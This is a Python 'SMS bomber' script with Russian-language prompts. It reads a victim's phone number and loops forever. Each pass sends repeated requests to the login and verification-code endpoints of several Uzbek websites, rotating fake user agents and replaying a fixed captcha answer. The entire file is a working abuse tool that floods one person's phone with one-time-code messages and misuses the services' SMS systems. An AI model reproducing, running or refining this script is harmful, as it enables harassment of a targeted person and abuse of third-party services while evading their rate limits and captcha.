import time

import requests, fake_useragent

user = fake_useragent.UserAgent().random
headers = {'user_agent': user}
NUMBER = input('Введите номер телефона c(+): ')
NONE_N = input('Введите номер телефона без (+): ')

while True:
    user = fake_useragent.UserAgent().random
    headers = {'user_agent': user}
    try:
        response = requests.post('https://api.auth.newmediapark.uz/login-otp', headers=headers,
                                 json={"role_id": "06d63125-e7a2-4616-afa4-cd50ee3ac33d", "language": "ru", "username": NUMBER,"source": "web"})
        print('Отправка прошла успешна')
    except:
        print('Что то пошло не так')
    try:
        response = requests.post('https://pharmaclick.uz/bitrix/services/main/ajax.php?mode=class&c=infinity%3AauthBySMS&action=checkPhone', headers=headers, data={'phone': NUMBER})
        print('Отправка прошла успешна')
    except:
        print('Что то пошло не так')
    try:
        response = requests.post('https://api.gopharm.uz/api/v1/register-captcha?region=1&lan=ru', headers=headers,
                                 json={"login": NONE_N, "captcha_key": "99b7c8d0-40bc-44af-bfe4-584a6ae95a44", "captcha_value": "6897"})
        print('Отправка прошла успешна')
    except:
        print('Что то пошло не так')
    try:
        response = requests.post('https://api.auth.newmediapark.uz/login-otp', headers=headers,
                                 json={"role_id": "06d63125-e7a2-4616-afa4-cd50ee3ac33d", "language": "ru", "username": NUMBER,"source": "web"})
        print('Отправка прошла успешна')
    except:
        print('Что то пошло не так')
    try:
        response = requests.post('https://pharmaclick.uz/bitrix/services/main/ajax.php?mode=class&c=infinity%3AauthBySMS&action=checkPhone', headers=headers, data={'phone': NUMBER})
        print('Отправка прошла успешна')
    except:
        print('Что то пошло не так')
    try:
        response = requests.post('https://api.gopharm.uz/api/v1/register-captcha?region=1&lan=ru', headers=headers,
                                 json={"login": NONE_N, "captcha_key": "99b7c8d0-40bc-44af-bfe4-584a6ae95a44", "captcha_value": "6897"})
        print('Отправка прошла успешна')
    except:
        print('Что то пошло не так')
    try:
        response = requests.post('https://api.auth.newmediapark.uz/login-otp', headers=headers,
                                 json={"role_id": "06d63125-e7a2-4616-afa4-cd50ee3ac33d", "language": "ru", "username": NUMBER,"source": "web"})
        print('Отправка прошла успешна')
    except:
        print('Что то пошло не так')
    try:
        response = requests.post('https://pharmaclick.uz/bitrix/services/main/ajax.php?mode=class&c=infinity%3AauthBySMS&action=checkPhone', headers=headers, data={'phone': NUMBER})
        print('Отправка прошла успешна')
    except:
        print('Что то пошло не так')
    try:
        response = requests.post('https://api.gopharm.uz/api/v1/register-captcha?region=1&lan=ru', headers=headers,
                                 json={"login": NONE_N, "captcha_key": "99b7c8d0-40bc-44af-bfe4-584a6ae95a44", "captcha_value": "6897"})
        print('Отправка прошла успешна')
    except:
        print('Что то пошло не так')
    try:
        response = requests.post('https://api.auth.newmediapark.uz/login-otp', headers=headers,
                                 json={"role_id": "06d63125-e7a2-4616-afa4-cd50ee3ac33d", "language": "ru", "username": NUMBER,"source": "web"})
        print('Отправка прошла успешна')
    except:
        print('Что то пошло не так')
    try:
        response = requests.post('https://pharmaclick.uz/bitrix/services/main/ajax.php?mode=class&c=infinity%3AauthBySMS&action=checkPhone', headers=headers, data={'phone': NUMBER})
        print('Отправка прошла успешна')
    except:
        print('Что то пошло не так')
    try:
        response = requests.post('https://api.gopharm.uz/api/v1/register-captcha?region=1&lan=ru', headers=headers,
                                 json={"login": NONE_N, "captcha_key": "99b7c8d0-40bc-44af-bfe4-584a6ae95a44", "captcha_value": "6897"})
        print('Отправка прошла успешна')
    except:
        print('Что то пошло не так')
    try:
        response = requests.post('https://api.auth.newmediapark.uz/login-otp', headers=headers,
                                 json={"role_id": "06d63125-e7a2-4616-afa4-cd50ee3ac33d", "language": "ru", "username": NUMBER,"source": "web"})
        print('Отправка прошла успешна')
    except:
        print('Что то пошло не так')
    try:
        response = requests.post('https://pharmaclick.uz/bitrix/services/main/ajax.php?mode=class&c=infinity%3AauthBySMS&action=checkPhone', headers=headers, data={'phone': NUMBER})
        print('Отправка прошла успешна')
    except:
        print('Что то пошло не так')
    try:
        response = requests.post('https://api.gopharm.uz/api/v1/register-captcha?region=1&lan=ru', headers=headers,
                                 json={"login": NONE_N, "captcha_key": "99b7c8d0-40bc-44af-bfe4-584a6ae95a44", "captcha_value": "6897"})
        print('Отправка прошла успешна')
    except:
        print('Что то пошло не так')
    try:
        response = requests.post('https://io.bellissimo.uz/api/verify-web', headers=headers, data={'phone': NUMBER})   # работает через каждые 3 часа
        print('Отправка прошла успешна')
    except:
        print('Что то пошло не так')
    try:
        response = requests.post('https://api.express24.uz/client/v4/authentication/code', headers=headers, data={'phone': NUMBER}) #Работает через каждые 3 часа
        print('Отправка прошла успешна')
    except:
        print('Что то пошло не так')


